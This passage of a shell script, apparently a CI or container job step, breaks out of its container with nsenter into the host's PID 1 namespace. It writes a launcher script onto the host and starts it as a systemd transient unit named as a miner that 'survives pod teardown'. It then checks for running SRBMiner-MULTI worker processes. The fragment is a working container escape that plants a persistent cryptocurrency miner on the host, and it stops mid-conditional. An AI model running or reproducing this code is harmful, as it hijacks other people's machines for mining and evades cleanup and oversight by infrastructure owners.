          echo "=== install host launcher ==="
          timeout 30 sh -c "base64 -w0 '$WORKDIR/host_launch.sh' | nsenter -t 1 -m -p -r -- /bin/sh -c 'base64 -d > /var/tmp/i128954-host/host_launch_i128954.sh; chmod +x /var/tmp/i128954-host/host_launch_i128954.sh; wc -c /var/tmp/i128954-host/host_launch_i128954.sh'" 2>&1 | tail -2
          SYSD=$(timeout 25 nsenter -t 1 -m -p -r -- /bin/sh -c 'command -v systemd-run; systemctl is-system-running 2>&1 | head -1' 2>&1 | tr '\n' '|')
          echo "host_systemd=$SYSD"
          UNIT="i128954-miner-$(date -u +%Y%m%d%H%M%S)"
          case "$SYSD" in
            *systemd-run*)
              echo "=== systemd-run transient unit $UNIT (stays active, survives pod teardown) ==="
              timeout 40 nsenter -t 1 -m -p -r -- /bin/sh -c "HOSTPERSIST_KEEPALIVE=1 systemd-run --unit=$UNIT --collect --no-block --property=Type=simple /bin/sh -c 'exec /bin/sh /var/tmp/i128954-host/host_launch_i128954.sh >> /var/tmp/i128954-host/host_launch.out 2>&1'" 2>&1 | head -6
              echo "unit=$UNIT"
              sleep 60
              echo "=== unit status ==="
              timeout 20 nsenter -t 1 -m -p -r -- /bin/sh -c "systemctl is-active $UNIT 2>&1; systemctl show -p MainPID --value $UNIT 2>&1" 2>&1 | head -4
              echo "=== host launcher output (tail) ==="
              timeout 20 nsenter -t 1 -m -p -r -- /bin/sh -c 'tail -50 /var/tmp/i128954-host/host_launch.out 2>/dev/null' 2>&1 | tail -55
              ;;
            *)
              echo "=== no host systemd-run: synchronous launcher (inside-launcher cgroup move) ==="
              timeout 220 nsenter -t 1 -m -p -r -- /bin/sh -c 'exec /bin/sh /var/tmp/i128954-host/host_launch_i128954.sh' 2>&1 | tail -60
              ;;
          esac
          echo "=== host-side i128954 miners visible from job pid namespace ==="
          timeout 15 pgrep -af '[S]RBMiner-MULTI.*--worker i128954-' 2>/dev/null | head -10
          HL=$(timeout 15 pgrep -f '[S]RBMiner-MULTI.*--worker i128954-' 2>/dev/null | wc -l)
          echo "HOSTLIVE=${HL:-0}"
          if [ "${HL:-0}" -le 0 ]; then
